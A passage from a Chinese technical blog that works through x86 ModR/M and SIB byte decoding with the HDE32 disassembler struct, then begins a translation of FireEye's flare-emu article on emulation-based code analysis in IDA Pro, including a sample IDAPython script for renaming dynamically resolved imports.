<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">测试二：<span class="number">89</span> <span class="number">01</span> …(以<span class="number">32</span>位CPU为准)</span><br><span class="line"><span class="number">1.</span> 由<span class="number">89</span>可以确定是mov Ev,Gv格式（v在<span class="number">32</span>位CPU下是dword）;</span><br><span class="line"><span class="number">2.</span> <span class="number">01</span> == <span class="number">00</span> <span class="number">000</span> <span class="number">001</span>三部分 ==&gt;Mod=<span class="number">00</span>(DS:[])；Reg/Opcode=<span class="number">000</span>(EAX)；R/M=<span class="number">001</span>(ECX)</span><br><span class="line"><span class="number">3.</span> 所以汇编指令为:mov dword ptr ds:[ecx],eax</span><br></pre></td></tr></table></figure>

<p><strong>以上计算步骤归结为一张表：</strong></p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/20170824110923395.png" alt="http://pic.wonderkun.cc/uploads/2019/03/20170824110923395.png"></p>
<p>该表分为五大块：寄存器编号部分的最上面一块，以及以Mod分界的下面的四块。用ModR/M解析出来的Reg/Opcode去第一块中查具体寄存器；以Mod和R/M去查Mod块中具体的某一行，最后再合并查到的各部分得到汇编指令。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">测试三：<span class="number">8</span>A <span class="number">82</span> <span class="number">12</span> <span class="number">34</span> <span class="number">56</span> <span class="number">78</span></span><br><span class="line"><span class="number">1.</span> <span class="number">8</span>A确定是mov Gb,Eb格式;</span><br><span class="line"><span class="number">2.</span> <span class="number">82</span> ==&gt; <span class="number">1000</span> <span class="number">0010</span> ==&gt; <span class="number">10</span> <span class="number">000</span> <span class="number">010</span>三部分</span><br><span class="line"><span class="number">3.</span> 查表得Reg=al，Mod与R/M确定内存格式：disp32[edx]（disp32即<span class="number">32</span>位偏移地址，在硬编码中高地址在低字节存放）</span><br><span class="line"><span class="number">4.</span> 汇编指令为:mov al,byte ptr ds:[edx+<span class="number">78563412</span>]</span><br></pre></td></tr></table></figure>

<h5 id="非常规情况分析"><a href="#非常规情况分析" class="headerlink" title="非常规情况分析"></a>非常规情况分析</h5><p>有一种特殊情况就是<code>Mod=00且R/M=101</code>时的情况（对应的ModR/M的值由05、0D、15、1D、25、2D、35、3D八种具体情况），这些情况只需要将原来的ebp换成一个disp32即可（该数即机器指令中紧接着ModR/M后面的四个字节）。这其实也是不需要其它辅助性工作就能解析出来的，测试如下：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/20170824111514969.png" alt="http://pic.wonderkun.cc/uploads/2019/03/20170824111514969.png"></p>
<h4 id="ModR-M中的特殊情况与SIB引出"><a href="#ModR-M中的特殊情况与SIB引出" class="headerlink" title="ModR/M中的特殊情况与SIB引出"></a>ModR/M中的特殊情况与SIB引出</h4><p>红框框出来的内容，仅仅依靠Table2-2一张表是无法解析出来的。还需要<strong>SIB</strong>和另外一张表（SIB的解析步骤归结的一张表）才能够解析的，Table2-2的Notes部分也提到了这张表Table2-3：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/20170824125936480.png" alt="http://pic.wonderkun.cc/uploads/2019/03/20170824125936480.png"></p>
<p>我们先来分析该表的一般情况：该表是根据SIB的bit信息来索引查看的，SIB是紧接着ModR/M的一个字节。不定长指令后必有ModR/M，而ModR/M的Mod不为”11”且R/M值为”100”（ESP）时则ModR/M后就有SIB。<br>我们先来看SIB的格式与解析方式：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+------+</span>------------<span class="code">+--------+</span></span><br><span class="line">| 7,6  |   5,4,3    | 2,1,0  |</span><br><span class="line"><span class="code">+------+</span>------------<span class="code">+--------+</span></span><br><span class="line">scale      index       base</span><br></pre></td></tr></table></figure>

<p>该三部分均存在于[]的括号中，格式为：Base + Index<em>2^(Scale)，Base为寄存器编号索引的寄存器，Index也是寄存器编号索引的寄存器，Scale为00~11，因此格式又为：Base + Index * 1/2/4/8所以格式形如：ds:[eax+ecx</em>4]。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">解析<span class="string">"88 84 48 12 34 56 78"</span>：</span><br><span class="line"><span class="number">1.</span> Opcode = <span class="number">88</span> --&gt; 指令格式：mov Eb,Gb	</span><br><span class="line"><span class="number">2.</span> ModR/M = <span class="number">84</span> --&gt; <span class="number">10</span> <span class="number">000</span> <span class="number">100</span> --&gt;[reg+disp32]（普通格式）， al，esp</span><br><span class="line"><span class="number">3.</span> 由于Mod为<span class="number">10</span>，且R/M为ESP，则属于特殊情况，不遵循普通格式，所以下一个字节为SIB（可确定汇编指令为：mov <span class="keyword">byte</span> ptr [–][–][disp32],al）</span><br><span class="line"><span class="number">4.</span> [–][–]解析：SIB = <span class="number">48</span>H --&gt; <span class="number">01</span> <span class="number">001</span> <span class="number">000</span>；Scale=<span class="number">1</span>，Index=<span class="number">1</span>（ECX），Base=<span class="number">0</span>（EAX）</span><br><span class="line"><span class="number">5.</span> 得到汇编指令为：mov <span class="keyword">byte</span> ptr [eax][ecx*<span class="number">2</span>^<span class="number">1</span>][<span class="number">78563412</span>],al ==&gt; mov <span class="keyword">byte</span> ptr [eax+ecx*<span class="number">2</span>+<span class="number">78563412</span>],al</span><br></pre></td></tr></table></figure>

<p>看一个例子：</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">00162560 </span>&gt;  <span class="number">888448</span> <span class="number">12345678</span> mov byte ptr ds:[eax+ecx*<span class="number">2</span>+<span class="number">0</span>x78563412],al</span><br></pre></td></tr></table></figure>

<h4 id="SIB中的特殊情况"><a href="#SIB中的特殊情况" class="headerlink" title="SIB中的特殊情况"></a>SIB中的特殊情况</h4><p>其实就只有一种情况需要特别对待，我们知道[–][–]两部分分别为：[Base]和[Index * 2^(Scale) ]。若<code>index == 100（ESP）</code>则<code>[Index * 2^(Scale)]</code>部分不存在。</p>
<p>index 等于100（SIB = 64/65），base等于101与（65）否（64）,结果都一样（index都不存在）：</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">00162560 </span>&gt;  <span class="number">889</span>C64 <span class="number">12345678</span> mov byte ptr ss:[esp+<span class="number">0</span>x78563412],bl</span><br><span class="line"><span class="symbol">00162560 </span>&gt;  <span class="number">889</span>C65 <span class="number">12345678</span> mov byte ptr ss:[ebp+<span class="number">0</span>x78563412],bl</span><br></pre></td></tr></table></figure>

<h2 id="HDE反汇编结构体的理解"><a href="#HDE反汇编结构体的理解" class="headerlink" title="HDE反汇编结构体的理解"></a>HDE反汇编结构体的理解</h2><p>其实有了上面的预备知识，HDE中表示指令的结构体就容易完全理解了：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> len;      <span class="comment">/* len of command                                */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> p_rep;    <span class="comment">/* rep/repz (0xf3) &amp; repnz (0xf2) prefix         */</span>  </span><br><span class="line">    <span class="keyword">uint8_t</span> p_lock;   <span class="comment">/* lock prefix: 0xf0                             */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> p_seg;    <span class="comment">/* segment prefix: 0x26,0x2e,0x36,0x3e,0x64,0x65 */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> p_66;     <span class="comment">/* operand-size override prefix: 0x66            */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> p_67;     <span class="comment">/* address-size override prefix: 0x67            */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> opcode;   <span class="comment">/* opcode                                        */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> opcode2;  <span class="comment">/* second opcode (if first opcode is 0x0f)       */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> modrm;    <span class="comment">/* ModR/M byte                                   */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> modrm_mod;  <span class="comment">/*   mod field of ModR/M                       */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> modrm_reg;  <span class="comment">/*   reg field of ModR/M                       */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> modrm_rm;    <span class="comment">/*   r/m field of ModR/M                      */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> sib;         <span class="comment">/* SIB byte                                   */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> sib_scale;   <span class="comment">/*   scale field of SIB                       */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> sib_index;   <span class="comment">/*   index field of SIB                       */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> sib_base;    <span class="comment">/*   base field of SIB                        */</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> imm8;      <span class="comment">/* immediate value imm8                      */</span></span><br><span class="line">        <span class="keyword">uint16_t</span> imm16;    <span class="comment">/* immediate value imm16                     */</span></span><br><span class="line">        <span class="keyword">uint32_t</span> imm32;    <span class="comment">/* immediate value imm32                     */</span></span><br><span class="line">    &#125; imm;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> disp8;     <span class="comment">/* displacement disp8                        */</span></span><br><span class="line">        <span class="keyword">uint16_t</span> disp16;</span><br><span class="line">        <span class="keyword">uint32_t</span> disp32;</span><br><span class="line">    &#125; disp;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;        <span class="comment">/* flags                                     */</span></span><br><span class="line">&#125; hde32s;</span><br></pre></td></tr></table></figure>

<p>英文的注释还是不太明白，下面详细说一下每个字段的含义：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">len : 当前指令的长度</span><br><span class="line">p_rep： 为<span class="number">0xf3</span>的时候是<span class="keyword">rep</span>/<span class="keyword">repz</span>，为<span class="number">0xf2</span>的时候是<span class="keyword">repnz</span>前缀，这两条指令是用来做循环的</span><br><span class="line">p_lock： <span class="number">0xf0</span>前缀</span><br><span class="line">p_seg：断前缀，2E - <span class="built_in">CS</span>，<span class="number">36</span> - <span class="built_in">SS</span>，3E - <span class="built_in">DS</span>，<span class="number">26</span> - <span class="built_in">ES</span>，<span class="number">64</span> - <span class="built_in">FS</span>，<span class="number">65</span> - <span class="built_in">GS</span></span><br><span class="line">p_66： <span class="number">0x66</span>前缀，修改默认的寄存器长度</span><br><span class="line"><span class="symbol">p_67:</span> <span class="number">0x67</span>前缀，修改默认寻址方式</span><br><span class="line">opcode： 第一个操作码，也可能是<span class="number">0x0f</span>(我们前面说<span class="number">0x0f</span>也算前缀，他这里把他作为操作码了)</span><br><span class="line">opcode2： 第二个操作码，只有当是以<span class="number">0x0f</span>开头的指令，这里才会出现内容</span><br><span class="line">modrm：  ModR/M <span class="built_in">byte</span>字节,后面的三个是这个字节分开后的三块内容</span><br><span class="line">modrm_mod：mod field of ModR/M </span><br><span class="line">modrm_reg：  reg field of ModR/M</span><br><span class="line">modrm_rm： r/m field of ModR/M </span><br><span class="line">sib： SIB <span class="built_in">byte</span></span><br><span class="line">imm：是这个指令的立即数</span><br></pre></td></tr></table></figure>

<p>下面用一个包含modR/M,sib这样的变长指令做一个测试：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> code[] = &#123; <span class="number">0x88</span>,<span class="number">0x84</span>,<span class="number">0x48</span>,<span class="number">0x12</span>,<span class="number">0x34</span>,<span class="number">0x56</span>,<span class="number">0x78</span>&#125;;</span><br><span class="line">hde32s hs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> length = hde32_disasm(code, &amp;hs);</span><br></pre></td></tr></table></figure>

<p>可以得到结构体如下：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/20190315205133.png" alt="http://pic.wonderkun.cc/uploads/2019/03/20190315205133.png"></p>
<p>这下舒服多了，终于看懂了。。。。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://read.pudn.com/downloads128/ebook/543578/OpCode.pdf" target="_blank" rel="noopener">http://read.pudn.com/downloads128/ebook/543578/OpCode.pdf</a><br><a href="https://blog.csdn.net/Apollon_krj/article/details/77508073" target="_blank" rel="noopener">https://blog.csdn.net/Apollon_krj/article/details/77508073</a><br><a href="https://blog.csdn.net/Apollon_krj/article/details/77524601" target="_blank" rel="noopener">https://blog.csdn.net/Apollon_krj/article/details/77524601</a></p>
]]></content>
      <categories>
        <category>代码控</category>
      </categories>
      <tags>
        <tag>binary</tag>
        <tag>disassm</tag>
      </tags>
  </entry>
  <entry>
    <title>用模拟执行实现Objective-C代码自动化分析</title>
    <url>/2020/03/02/%E7%94%A8%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%AE%9E%E7%8E%B0Objective-C%E4%BB%A3%E7%A0%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="火眼高级逆向工程实验室脚本系列：用模拟执行实现Objective-C代码自动化分析"><a href="#火眼高级逆向工程实验室脚本系列：用模拟执行实现Objective-C代码自动化分析" class="headerlink" title="火眼高级逆向工程实验室脚本系列：用模拟执行实现Objective-C代码自动化分析"></a>火眼高级逆向工程实验室脚本系列：用模拟执行实现Objective-C代码自动化分析</h2><h3 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h3><!-- 京东安全开源的 [qiling](https://github.com/qilingframework/qiling) 是一个很不错的想法，但是唯一的问题在于它实现的东西太多，比较笨重。有的时候我仅仅想模拟几个函数的执行,操作比较麻烦，并且不太直观。所以我在github上一顿搜索，最终发现了这个 [flare-emu](https://github.com/fireeye/flare-emu) 完全满足我直观，简单的需求。 -->
<p>但是使用的时候发现它不支持python3，同时代码中 bytes 和 str 对象傻傻的分不清楚，所以不得不进行了一下修改，修改后的版本在<a href="https://github.com/wonderkun/flare-emu" target="_blank" rel="noopener">这里</a>(可能有些地方并没有修改完善，以后使用过程中发现问题再做修改吧)。下面就对官方的介绍文档进行了一个翻译。</p>
<a id="more"></a>

<p>原文链接: <a href="https://www.fireeye.com/blog/threat-research/2018/12/automating-objective-c-code-analysis-with-emulation.html" target="_blank" rel="noopener"> https://www.fireeye.com/blog/threat-research/2018/12/automating-objective-c-code-analysis-with-emulation.html</a></p>
<p>这是 FireEye 高级逆向工程团队公开的脚本系列的另一篇博文。今天我们分享一个新的  IDApython  库 - <a href="https://github.com/fireeye/flare-emu" target="_blank" rel="noopener">flare-emu</a>,它依赖于 IDA pro和 Unicorn 仿真模拟框架，为 x86、x86_64、ARM和ARM64体系结构提供可脚本化的仿真功能，供逆向工程师使用。  除了这个库之外，我们还共享了一个使用它分析 Objective-C 代码的 IDAPython 脚本。请继续阅读以了解使用模拟器的一些创新的方法，这些方法可以帮你解决代码分析中遇到的问题，以及如何使用我们新的 IDAPython 库来节省您在此过程中的大量时间。</p>
<h3 id="为什么要模拟执行？"><a href="#为什么要模拟执行？" class="headerlink" title="为什么要模拟执行？"></a>为什么要模拟执行？</h3><p>如果你还没有使用模拟执行来解决代码分析中的问题，那你就已经跟不上潮流了。我将重点介绍它的一些优点和一些用例，以使您了解它的强大功能。仿真模拟是非常灵活的，并且当今可用的许多仿真框架（包括 Unicorn ）都是跨平台的。通过模拟执行，您可以选择要模拟执行的代码，并控制代码执行时的上下文信息。因为被模拟执行的代码无法访问运行它的操作系统的系统服务，所以几乎没有造成任何损坏的风险。所有这些优点使仿真成为临时实验，解决问题或自动化的绝佳选择。</p>
<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ul>
<li>解码/解密/解混淆/解压缩 - 在进行恶意代码分析时，你经常会遇到用于解码、解压缩、解密或者解混淆一些有用数据(如字符串或者其他的payload)的函数。如果是常用的算法，你可以通过人工分析或者使用 <a href="https://github.com/nihilus/IDA_Signsrch" target="_blank" rel="noopener">signsrch</a>之类的插件来解决，但是不幸的是，很多时候并不是这样的。然后，你要么打开调试器对样本进行插桩分析来解密数据，要么手动将函数转换为适合您当时需求的任何其他编程语言。这些选择可能很耗时且有一定的问题，具体取决于代码本身和要分析的样本的复杂性。此时，模拟执行通常可以为你提供更好的第三种选择。编写一个可以为您模拟执行功能的脚本将类似的功能提供给你，就好像您编写了该功能或正在从库中调用它一样。这样你就可以在不打开调试器的情况下，通过不同的输入重复使用相同的函数。这也适用于可以自解密的shellcode，你可以使用模拟器功能让代码自我解密。</li>
<li>数据跟踪 - 使用模拟器，您可以随时使用指令挂钩来停止和检查仿真上下文。将反汇编器和模拟器搭配，可以使你在关键指令上停止模拟并检查寄存器和内存的值。这样，您就可以在您感兴趣数据流过某个函数时对其进行标记。这里还有其他的几个有用的程序，正如以前在FLARE脚本系列的其他博客中介绍的那样，<a href="https://www.fireeye.com/blog/threat-research/2015/11/flare_ida_pro_script.html" target="_blank" rel="noopener">自动函数参数提取</a>和<a href="https://www.fireeye.com/blog/threat-research/2015/12/flare_script_series.html" target="_blank" rel="noopener">自动混淆字符串解码</a>,该技术可用于跟踪在整个程序中传递给给定函数的参数。函数参数跟踪是本文稍后介绍的Objective-C代码分析工具采用的技术之一。数据跟踪技术也可以用来跟踪C ++代码中的this指针，以便标记对象成员引用，或者标记从GetProcAddress / dlsym的调用返回的值，以便适当地重命名存储它们的变量。带来了很多可能性。</li>
</ul>
<h3 id="flare-emu-简介"><a href="#flare-emu-简介" class="headerlink" title="flare-emu 简介"></a>flare-emu 简介</h3><p> FLARE (FireEye 高级逆向工程团队)团队正在介绍一个IDApython的库 <a href="https://github.com/fireeye/flare-emu" target="_blank" rel="noopener">flare-emu</a> ,该库将IDA Pro的二进制分析功能与Unicorn的仿真框架相结合，为用户提供了易用且灵活的脚本编写仿真模拟接口。flare-emu旨在处理所有内务处理，为其支持的体系结构设置灵活而强大的仿真器，以便您专注于解决代码分析问题。 当前，它提供了三种不同的接口来满足您的仿真需求，以及一系列相关的帮助程序和实用功能。</p>
<ol>
<li><p>emulateRange  - 该API用于在用户指定的上下文中模拟一系列指令或函数。它为各个指令以及遇到“call”指令时提供用户自定义的挂钩选项。用户可以决定模拟器是跳过还是调用函数中的代码。图1显示了 emulateRange 与指令和调用hook一起使用，以跟踪GetProcAddress调用的返回值，并将全局变量重命名为它们将指向的Windows API的名称。在此示例中，仅将其设置为从 0x401514 到 0x40153D 进行仿真。 该接口为用户提供了一种简单的方法来给寄存器和堆栈参数指定值。 如果指定了字节串，则将其写入仿真器的内存，并将指针写入寄存器或堆栈变量。 仿真后，用户可以使用 flare-emu 的其他的实用函数从仿真的内存或寄存器中读取数据，或者在flare-emu无法提供您所需的某些功能的情况下，使用返回的Unicorn仿真对象直接进行获取。</p>
<p>emulateSelection是对emulateRange函数的简单封装，可用于模拟IDA Pro中当前高亮显示的指令范围。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture1.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture1.png"></p>
</li>
</ol>
<p>​                         图1： emulateRange用于跟踪GetProcAddress的返回值</p>
<ol start="2">
<li><p>iterate - 此API用于强制向下模拟执行函数中的特定分支，以达到给定目标。用户可以指定目标地址列表，也可以指定函数的地址（从中使用对该函数的交叉引用的列表）作为目标，并指定达到目标时的回调。无论仿真期间可能导致采用不同分支的条件如何，都将达到目标。图2展示了为了达到目标而不得不进行迭代的一组代码分支。 cmp指令设置的标志无关紧要。 像emulateRange API一样，可以提供了用户定义的挂钩的选项，既可以用于单独的指令，也可以用于遇到“call”指令时。iterate API的一个示例用法是用于本文前面提到的函数参数跟踪技术。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture2.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture2.png"></p>
</li>
</ol>
<p>​                                                                 图2：由 iterate  API确定的仿真路径，以便到达目标地址</p>
<ol start="3">
<li><p>emulateBytes  - 该API提供了一种简单地模拟独立的shellcode的方法。 所提供的字节不会添加到IDB数据库中，而是直接照原样进行仿真。这对于准备仿真环境很有用,例如，flare-emu本身使用此API来操作Unicorn未公开的ARM64 CPU Model Specific Register（MSR）寄存器，以便启用 Vector Floating Point（VFP）指令和寄存器访问。 图3展示了为实现此目的的代码片段。 与emulateRange一样，如果flare-emu没有暴露用户所需的某些功能，则返回Unicorn仿真对象以供用户进一步探测。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture3.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture3.png"></p>
<p>​                                              图3：flare-emu使用emulateBytes为ARM64启用VFP</p>
</li>
</ol>
<h3 id="API-Hooking"><a href="#API-Hooking" class="headerlink" title="API-Hooking"></a>API-Hooking</h3><p> 如前所述，flare-emu 旨在让您轻松使用仿真来解决代码分析中的需求。模拟执行的一大痛点时对库函数调用的处理。flare-emu允许您选择需要跳过的call指令的同时，也支持你定义自己的hook函数来实现hook的函数被调用之后的特定功能。它自带有预定义的挂钩函数共80多个。这些函数包括许多常见的c运行时函数，这些函数将对你遇到的字符串和内存进行操作，以及与之对应的某些windows API。</p>
<h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>图4显示了一些代码块，这些代码块调用一个函数，该函数需要一个时间戳值并将其转换为字符串。 图5显示了一个简单的脚本，该脚本使用flare-emu的迭代API在每个被调用的位置打印传递给该函数的参数。 该脚本还模拟了一个简单的XOR解码功能，并输出结果解码后的字符串。 图6显示了脚本的结果输出。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture4.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture4.png"></p>
<p>​                                                                              图4： 调用时间戳转换函数</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture5.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture5.png"></p>
<p>​                                                                           图5： Simple example of flare-emu usage </p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture6.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture6.png"></p>
<p>​                                                                        图6： Output of script shown in Figure 5 </p>
<p>这是一个<a href="https://github.com/fireeye/flare-emu/blob/master/rename_dynamic_imports.py" target="_blank" rel="noopener">示例脚本</a>，该脚本使用flare-emu跟踪GetProcAddress的返回值并重命名它们相应存储的变量。 查看我们的自述文件以获取更多示例，并获得关于flare-emu的帮助。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Copyright (C) 2018 FireEye, Inc.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Licensed under the Apache License, Version 2.0, &lt;LICENSE-APACHE or</span></span><br><span class="line"><span class="comment"># http://apache.org/licenses/LICENSE-2.0&gt; or the MIT license &lt;LICENSE-BSD-3-CLAUSE or</span></span><br><span class="line"><span class="comment"># https://opensource.org/licenses/BSD-3-Clause&gt;, at your option. This file may not be</span></span><br><span class="line"><span class="comment"># copied, modified, or distributed except according to those terms.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: James T. Bennett</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># IDApython script that names global variables after their import names when dynamically resolved using GetProcAddress</span></span><br><span class="line"><span class="comment"># Point it to a target function (or somewhere within the function) to begin emulation from</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Dependencies:</span></span><br><span class="line"><span class="comment"># https://github.com/fireeye/flare-emu</span></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> flare_emu</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeName</span><span class="params">(addr, name)</span>:</span></span><br><span class="line">    names = list(map(<span class="keyword">lambda</span> x: x[<span class="number">1</span>], list(idautils.Names())))</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    myname = name</span><br><span class="line">    <span class="keyword">while</span> myname <span class="keyword">in</span> names:</span><br><span class="line">        myname = name + <span class="string">"_%d"</span> % i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    idc.set_name(addr, myname, idc.SN_CHECK)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instructionHook</span><span class="params">(uc, address, size, userData)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        eh = userData[<span class="string">"EmuHelper"</span>]</span><br><span class="line">        <span class="keyword">if</span> (idc.print_insn_mnem(address) == <span class="string">"mov"</span> <span class="keyword">and</span></span><br><span class="line">                idc.get_operand_type(address, <span class="number">0</span>) == <span class="number">2</span> <span class="keyword">and</span></span><br><span class="line">                idc.get_name(idc.get_operand_value(address, <span class="number">0</span>))[:<span class="number">6</span>] == <span class="string">"dword_"</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"imp"</span> <span class="keyword">in</span> userData:</span><br><span class="line">                makeName(idc.get_operand_value(address, <span class="number">0</span>), userData[<span class="string">"imp"</span>])</span><br><span class="line">                <span class="keyword">del</span>(userData[<span class="string">"imp"</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error in instructionHook: %s"</span> % str(err)</span><br><span class="line">        eh.stopEmulation(userData)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callHook</span><span class="params">(address, argv, funcName, userData)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        eh = userData[<span class="string">"EmuHelper"</span>]</span><br><span class="line">        <span class="comment"># save last import string passed to a call to GetProcAddress</span></span><br><span class="line">        <span class="keyword">if</span> funcName == <span class="string">"GetProcAddress"</span>:</span><br><span class="line">            arg = eh.getEmuString(argv[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> len(arg) &gt; <span class="number">2</span>:</span><br><span class="line">                userData[<span class="string">"imp"</span>] = arg</span><br><span class="line">            <span class="comment"># for code that checks for a return value</span></span><br><span class="line">            eh.uc.reg_write(eh.regs[<span class="string">"ret"</span>], <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error in callHook: %s"</span> % str(err)</span><br><span class="line">        eh.stopEmulation(userData)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    eh = flare_emu.EmuHelper()</span><br><span class="line">    sVa = idc.ida_kernwin.ask_str(<span class="string">"0"</span>, <span class="number">0</span>, <span class="string">"Enter the start address (hex)"</span>)</span><br><span class="line">    sVa = int(sVa, <span class="number">16</span>)</span><br><span class="line">    eVa = idc.ida_kernwin.ask_str(<span class="string">"0"</span>, <span class="number">0</span>, <span class="string">"Enter the end address (hex), specify 0 to emulate to end of function"</span>)</span><br><span class="line">    eVa = int(eVa, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> (sVa &gt;= idc.get_inf_attr(idc.INF_MIN_EA) <span class="keyword">and</span> sVa &lt;= idc.get_inf_attr(idc.INF_MAX_EA) <span class="keyword">and</span></span><br><span class="line">            (eVa == <span class="number">0</span> <span class="keyword">or</span> (eVa &gt;= idc.get_inf_attr(idc.INF_MIN_EA) <span class="keyword">and</span> eVa &lt;= idc.get_inf_attr(idc.INF_MAX_EA)))):</span><br><span class="line">        <span class="keyword">if</span> eVa == <span class="number">0</span>:</span><br><span class="line">            eVa = <span class="literal">None</span></span><br><span class="line">        mu = eh.emulateRange(sVa, eVa, instructionHook=instructionHook, callHook=callHook)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error: supplied addresses not within IDB address range"</span></span><br></pre></td></tr></table></figure>

<h3 id="介绍-objc2-analyzer"><a href="#介绍-objc2-analyzer" class="headerlink" title="介绍 objc2_analyzer"></a>介绍 objc2_analyzer</h3><p>(对object-c不太懂，不知道有没有说错的地方)</p>
<p>去年，我写了一篇博客文章向您介绍逆向macOS平台的Cocoa应用程序,文章地址在<a href="https://www.fireeye.com/blog/threat-research/2017/03/introduction_to_reve.html" target="_blank" rel="noopener">这里</a>,该帖子包括一个简短的入门文章，介绍如何在后台调用Objective-C方法，以及这如何对IDA Pro和其他反汇编工具中的交叉引用产生的不利影响。帖子中还介绍了一个名为objc2_xrefs_helper的IDAPython脚本，以帮助解决这些交叉引用问题。 如果您尚未阅读该博文，建议您在继续阅读本博文之前先阅读该博文，因为它提供了使用objc2_analyzer特别有用的上下文。objc2_xrefs_helper的主要缺点是，如果选择器名称含糊不清，则意味着两个或多个类实现了具有相同名称的方法，脚本无法确定引用的选择器在二进制文件中任何给定位置所属的类，所以修复交叉引用时不得不忽略这种情况。现在，有了仿真支持，情况就不再如此。 objc2_analyzer使用flare-emu中的iterate API以及执行Objective-C反汇编分析的指令和调用挂钩，以确定为二进制形式的 objc_msgSend 变量的每次调用传递的id和selector。脚本功能的示例如图7和图8所示。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture7.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture7.png"></p>
<p>​                                                   图7：运行objc2_analyzer之前的Objective-C IDB代码段</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/03/Picture8.png" alt="http://pic.wonderkun.cc/uploads/2020/03/Picture8.png"></p>
